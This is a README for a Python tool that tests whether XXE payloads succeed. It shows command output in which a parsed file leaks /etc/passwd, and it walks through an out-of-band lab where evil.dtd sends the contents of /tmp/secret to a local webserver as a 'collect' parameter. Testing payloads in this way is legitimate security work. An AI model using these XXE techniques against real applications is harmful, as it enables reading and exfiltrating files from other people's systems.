xxetester
================

According to OWASP Top 10 of 2010, XXE vulnerabilities are one of the most common vulnerabilities in web applications. It is common to test an application for an XXE vulnerability without getting any feedback whether the exploit is successful. Especially with Blind XXEs it cannot be determined with certainty. The question then arises: Is my payload corrupt or the parser of the application actually secure? 

Since there are a lot of XXE articles and payloads on the internet and not every payload really leads to success, a tool had to be developed to test the validity of an XXE exploit.

The script parses the XML files on your system. Please be aware of this. DOS attacks like the billion laughs exploit will affect your own system.

How to use
-------------------------------
The script uses `lxml`. To install it you can execute the following command on your shell.
```
# pip3 install lxml
```

To test a payload the following command can be executed.

```
# python3 xxetester.py samples/catalog.xml 
<CATALOG>
<CD>
[...]
<TITLE>Unchain my heart</TITLE>
<ARTIST>Joe Cocker</ARTIST>
<COUNTRY>USA</COUNTRY>
<COMPANY>EMI</COMPANY>
<PRICE>8.20</PRICE>
<YEAR>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</YEAR>
</CD>
</CATALOG>
```

## Out-of-band XXE
Blind XXEs in particular are based on the fact that the application does not give the user any output at all. As an attacker you can only see if the application connects to your server. The `samples` folder contains an out-of-bands payload to read files from a system for testing purposes.


We simply execute the following commands to move the `secret` file into the `/tmp/` directory. This file represents the file that an attacker tries to access with the XXE. **Note that with the following payload we can only read files with a single line.** Then we change the directory to `samples`. In this directory is the `evil.dtd` file. This file will be loaded by the `oobxxe.xml` later on. Then we start a webserver on port 8090. 
```
# mv samples/secret /tmp/secret
# cd samples
# python3 -m http.server 8090
```
In a new terminal we execute the following command. 
```
# python3 xxetester.py samples/oobxxe.xml
StartTag: invalid element name, line 1, column 2 (127.0.0.1:8090?collect=1337SECRET1337, line 1)
If you wish more info execute this script with --verbose flag
```
With this command we can test the payload in `oobxxe.xml` which reads the `evil.dtd`. This .dtd file specifies the file that should be read and sent as an argument in a GET request. In our case `/tmp/secret` will be read and sent to our webserver.

Altough the script exits with an exception we see the following output on our webserver.
```
127.0.0.1 - - [05/Sep/2020 21:21:27] "GET /evil.dtd HTTP/1.0" 200 -
127.0.0.1 - - [05/Sep/2020 21:21:27] "GET /?collect=1337SECRET1337 HTTP/1.0" 200 -
```
With the first request the `evil.dtd` file is accessed. In the second GET request, the collect argument contains the contents of the `/tmp/secret` file.

